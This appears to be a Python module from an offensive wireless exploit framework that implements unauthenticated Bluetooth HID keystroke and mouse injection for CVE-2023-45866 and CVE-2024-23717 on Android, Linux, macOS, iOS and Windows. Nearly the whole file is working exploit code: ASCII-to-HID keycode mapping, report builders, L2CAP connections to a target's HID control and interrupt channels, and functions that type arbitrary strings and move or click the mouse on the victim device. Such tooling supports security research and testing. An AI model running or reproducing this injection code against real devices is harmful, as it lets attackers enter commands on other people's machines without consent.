#!/usr/bin/env python3
# Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
"""Native Bluetooth HID Keystroke & Mouse Injection (CVE-2023-45866 / CVE-2024-23717).

Unauthenticated HID injection via Bluetooth. Exploits SSP "Just Works"
pairing when the attacker declares NoInputNoOutput IO capability,
allowing injection of arbitrary keystrokes and mouse events without
user confirmation.

Supports: Android, Linux, macOS (with spoofed MAC), iOS, Windows.
Requires: Linux with BlueZ userspace tools (hciconfig/btmgmt), pybluez,
pydbus, and optional bdaddr (for MAC spoofing).

Improvements incorporated from upstream hi_my_name_is_keyboard:
  - Mouse HID report support (issue #17)
  - Handle spaces in Bluetooth name (PR #2)
  - CVE-2024-23717 coverage (Android 14 variant, issue #20)
  - Linux pairing fixes (issue #6)
  - Broadcom adapter fallback handling (issue #8)

Version: 1.2.0
"""


import enum
import logging
import shutil
import struct
import subprocess
import threading
import time
from typing import Dict, List, Optional, Tuple

from wirelessxpl.core.exploit import *
from wirelessxpl.core.os_guard import OSRequirement, requires_os

logger = logging.getLogger(__name__)

import socket as _bt_socket

# Native L2CAP socket — replaces pybluez (deprecated)
_AF_BLUETOOTH = 31
_BTPROTO_L2CAP = 0
HAS_PYBLUEZ = True  # native socket always available

try:
    import dbus
    import dbus.service
    from gi.repository import GLib
    HAS_DBUS = True
except ImportError:
    HAS_DBUS = False


# ─── HID Protocol Constants ─────────────────────────────────────────────────
PSM_SDP = 1
PSM_HID_CONTROL = 17
PSM_HID_INTERRUPT = 19

BT_CLASS_KEYBOARD = 0x002540

HID_HEADER_DATA_INPUT = 0xA1
HID_REPORT_ID_KEYBOARD = 0x01
HID_REPORT_ID_MOUSE = 0x02

BT_CLASS_KEYBOARD_MOUSE = 0x0025C0


class Mod(enum.IntFlag):
    """HID keyboard modifier flags."""
    NONE = 0x00
    LEFT_CTRL = 0x01
    LEFT_SHIFT = 0x02
    LEFT_ALT = 0x04
    LEFT_META = 0x08
    RIGHT_CTRL = 0x10
    RIGHT_SHIFT = 0x20
    RIGHT_ALT = 0x40
    RIGHT_META = 0x80


class Key(enum.IntEnum):
    """HID keyboard usage codes (USB HID Usage Table 0x07)."""
    NONE = 0x00
    A = 0x04; B = 0x05; C = 0x06; D = 0x07; E = 0x08; F = 0x09
    G = 0x0A; H = 0x0B; I = 0x0C; J = 0x0D; K = 0x0E; L = 0x0F
    M = 0x10; N = 0x11; O = 0x12; P = 0x13; Q = 0x14; R = 0x15
    S = 0x16; T = 0x17; U = 0x18; V = 0x19; W = 0x1A; X = 0x1B
    Y = 0x1C; Z = 0x1D
    N1 = 0x1E; N2 = 0x1F; N3 = 0x20; N4 = 0x21; N5 = 0x22
    N6 = 0x23; N7 = 0x24; N8 = 0x25; N9 = 0x26; N0 = 0x27
    ENTER = 0x28; ESCAPE = 0x29; BACKSPACE = 0x2A; TAB = 0x2B
    SPACE = 0x2C; MINUS = 0x2D; EQUAL = 0x2E; LBRACKET = 0x2F
    RBRACKET = 0x30; BACKSLASH = 0x31; SEMICOLON = 0x33
    APOSTROPHE = 0x34; GRAVE = 0x35; COMMA = 0x36; PERIOD = 0x37
    SLASH = 0x38; CAPSLOCK = 0x39
    F1 = 0x3A; F2 = 0x3B; F3 = 0x3C; F4 = 0x3D; F5 = 0x3E
    F6 = 0x3F; F7 = 0x40; F8 = 0x41; F9 = 0x42; F10 = 0x43
    F11 = 0x44; F12 = 0x45
    RIGHT_ARROW = 0x4F; LEFT_ARROW = 0x50
    DOWN_ARROW = 0x51; UP_ARROW = 0x52


_ASCII_TO_HID: dict[str, tuple] = {}


def _init_ascii_map() -> None:
    """Build ASCII character to HID keycode mapping."""
    lowercase = "abcdefghijklmnopqrstuvwxyz"
    for i, ch in enumerate(lowercase):
        _ASCII_TO_HID[ch] = (Key(0x04 + i),)
        _ASCII_TO_HID[ch.upper()] = (Key(0x04 + i), Mod.LEFT_SHIFT)

    digits = "1234567890"
    for i, ch in enumerate(digits):
        _ASCII_TO_HID[ch] = (Key(0x1E + i),)

    shifted_digits = {
        "!": Key.N1, "@": Key.N2, "#": Key.N3, "$": Key.N4, "%": Key.N5,
        "^": Key.N6, "&": Key.N7, "*": Key.N8, "(": Key.N9, ")": Key.N0,
    }
    for ch, key in shifted_digits.items():
        _ASCII_TO_HID[ch] = (key, Mod.LEFT_SHIFT)

    simple_map = {
        " ": (Key.SPACE,), "\n": (Key.ENTER,), "\t": (Key.TAB,),
        "-": (Key.MINUS,), "=": (Key.EQUAL,), "[": (Key.LBRACKET,),
        "]": (Key.RBRACKET,), "\\": (Key.BACKSLASH,), ";": (Key.SEMICOLON,),
        "'": (Key.APOSTROPHE,), "`": (Key.GRAVE,), ",": (Key.COMMA,),
        ".": (Key.PERIOD,), "/": (Key.SLASH,),
    }
    _ASCII_TO_HID.update(simple_map)

    shifted_symbols = {
        "_": Key.MINUS, "+": Key.EQUAL, "{": Key.LBRACKET,
        "}": Key.RBRACKET, "|": Key.BACKSLASH, ":": Key.SEMICOLON,
        '"': Key.APOSTROPHE, "~": Key.GRAVE, "<": Key.COMMA,
        ">": Key.PERIOD, "?": Key.SLASH,
    }
    for ch, key in shifted_symbols.items():
        _ASCII_TO_HID[ch] = (key, Mod.LEFT_SHIFT)


_init_ascii_map()


class MouseButton(enum.IntFlag):
    """HID mouse button flags."""
    NONE = 0x00
    LEFT = 0x01
    RIGHT = 0x02
    MIDDLE = 0x04


def keyboard_report(keys: list[Key] = None, modifiers: Mod = Mod.NONE) -> bytes:
    """Build an 11-byte HID keyboard input report.

    Format: [0xA1, 0x01, modifiers, 0x00, key1, key2, ..., key7]
    """
    keycodes = [k.value for k in (keys or [])][:7]
    keycodes += [0] * (7 - len(keycodes))
    return bytes([HID_HEADER_DATA_INPUT, HID_REPORT_ID_KEYBOARD,
                  int(modifiers), 0x00] + keycodes)


def mouse_report(buttons: MouseButton = MouseButton.NONE,
                 dx: int = 0, dy: int = 0, wheel: int = 0) -> bytes:
    """Build a 6-byte HID mouse input report.

    Format: [0xA1, 0x02, buttons, dx(signed), dy(signed), wheel(signed)]
    dx/dy/wheel are signed 8-bit (-127 to 127).
    """
    dx_b = struct.pack("b", max(-127, min(127, dx)))
    dy_b = struct.pack("b", max(-127, min(127, dy)))
    wh_b = struct.pack("b", max(-127, min(127, wheel)))
    return bytes([HID_HEADER_DATA_INPUT, HID_REPORT_ID_MOUSE,
                  int(buttons)]) + dx_b + dy_b + wh_b


def empty_report() -> bytes:
    """Build a key-release report (all zeros)."""
    return keyboard_report()


def empty_mouse_report() -> bytes:
    """Build a mouse button-release report."""
    return mouse_report()


def string_to_reports(text: str) -> list[tuple[bytes, bytes]]:
    """Convert a string to a list of (press, release) HID report pairs."""
    reports = []
    for ch in text:
        entry = _ASCII_TO_HID.get(ch)
        if entry is None:
            logger.warning("Unmapped character: %r", ch)
            continue
        if len(entry) == 2:
            key, mod = entry
            press = keyboard_report([key], mod)
        else:
            press = keyboard_report([entry[0]])
        reports.append((press, empty_report()))
    return reports


class L2CAPSocket:
    """Thin wrapper around a Bluetooth L2CAP socket."""

    def __init__(self, target: str, psm: int) -> None:
        self.target = target
        self.psm = psm
        self.sock: _bt_socket.socket | None = None

    def connect(self, timeout: float = 5.0) -> None:
        """Establish L2CAP connection."""
        self.sock = _bt_socket.socket(_AF_BLUETOOTH, _bt_socket.SOCK_SEQPACKET, _BTPROTO_L2CAP)
        self.sock.settimeout(timeout)
        self.sock.connect((self.target, self.psm))
        self.sock.setblocking(False)

    def send(self, data: bytes) -> None:
        """Send data on L2CAP channel."""
        if self.sock:
            self.sock.send(data)

    def recv(self, bufsize: int = 1024) -> bytes | None:
        """Non-blocking receive."""
        if not self.sock:
            return None
        try:
            return self.sock.recv(bufsize)
        except Exception:
            return None

    def close(self) -> None:
        """Close L2CAP connection."""
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
            self.sock = None


class HIDKeyboardClient:
    """Manages HID keyboard connections and keystroke injection."""

    def __init__(self, target: str) -> None:
        self.target = target
        self.sdp = L2CAPSocket(target, PSM_SDP)
        self.ctrl = L2CAPSocket(target, PSM_HID_CONTROL)
        self.intr = L2CAPSocket(target, PSM_HID_INTERRUPT)
        self.hid_ready = False
        self._exit = threading.Event()
        self._ack_thread: threading.Thread | None = None

    def connect(self, timeout: float = 5.0) -> bool:
        """Establish SDP + HID Control + HID Interrupt connections."""
        try:
            logger.info("Connecting SDP (PSM %d)...", PSM_SDP)
            self.sdp.connect(timeout)

            logger.info("Connecting HID Control (PSM %d)...", PSM_HID_CONTROL)
            self.ctrl.connect(timeout)

            logger.info("Connecting HID Interrupt (PSM %d)...", PSM_HID_INTERRUPT)
            self.intr.connect(timeout)

            self._ack_thread = threading.Thread(target=self._ack_loop, daemon=True)
            self._ack_thread.start()

            return True
        except Exception as err:
            logger.error("HID connection failed: %s", err)
            return False

    def _ack_loop(self) -> None:
        """Auto-acknowledge HID Control messages."""
        while not self._exit.is_set():
            raw = self.intr.recv()
            if raw in (b"\xa2\xf1\x01\x00", b"\xa2\x01\x01"):
                self.hid_ready = True

            raw = self.ctrl.recv()
            if raw is not None:
                if raw == b"\x15":
                    logger.warning("Host rejected HID connection (0x15)")
                    self.ctrl.close()
                    break
                self.ctrl.send(b"\x00")

            self.sdp.recv()
            time.sleep(0.01)

    def wait_ready(self, timeout: float = 10.0) -> bool:
        """Wait until HID channel is ready."""
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            if self.hid_ready:
                return True
            time.sleep(0.1)
        return self.hid_ready

    def send_keypress(self, keys: list[Key] = None,
                      modifiers: Mod = Mod.NONE,
                      delay: float = 0.004) -> None:
        """Send a single keypress (down + up)."""
        self.intr.send(keyboard_report(keys, modifiers))
        time.sleep(delay)
        self.intr.send(empty_report())
        time.sleep(delay)

    def type_string(self, text: str, delay: float = 0.02) -> None:
        """Type a string character by character."""
        for press, release in string_to_reports(text):
            self.intr.send(press)
            time.sleep(delay / 2)
            self.intr.send(release)
            time.sleep(delay / 2)

    def send_mouse_click(self, button: MouseButton = MouseButton.LEFT,
                         delay: float = 0.05) -> None:
        """Send a single mouse click (press + release)."""
        self.intr.send(mouse_report(button))
        time.sleep(delay)
        self.intr.send(empty_mouse_report())
        time.sleep(delay)

    def send_mouse_move(self, dx: int = 0, dy: int = 0,
                        delay: float = 0.004) -> None:
        """Send a relative mouse movement."""
        self.intr.send(mouse_report(MouseButton.NONE, dx, dy))
        time.sleep(delay)

    def send_mouse_scroll(self, amount: int = 1, delay: float = 0.01) -> None:
        """Send a mouse scroll event. Positive = up, negative = down."""
        self.intr.send(mouse_report(MouseButton.NONE, 0, 0, amount))
        time.sleep(delay)

    def move_to_relative(self, total_dx: int, total_dy: int,
                         steps: int = 10, delay: float = 0.01) -> None:
        """Smooth relative mouse movement split into incremental steps."""
        step_dx = total_dx // steps if steps else total_dx
        step_dy = total_dy // steps if steps else total_dy
        remainder_dx = total_dx - (step_dx * steps)
        remainder_dy = total_dy - (step_dy * steps)

        for i in range(steps):
            extra_x = 1 if i < abs(remainder_dx) else 0
            extra_y = 1 if i < abs(remainder_dy) else 0
            sx = (1 if remainder_dx > 0 else -1) if extra_x else 0
            sy = (1 if remainder_dy > 0 else -1) if extra_y else 0
            self.send_mouse_move(step_dx + sx, step_dy + sy, delay)

    def close(self) -> None:
        """Close all connections."""
        self._exit.set()
        self.sdp.close()
        self.ctrl.close()
        self.intr.close()


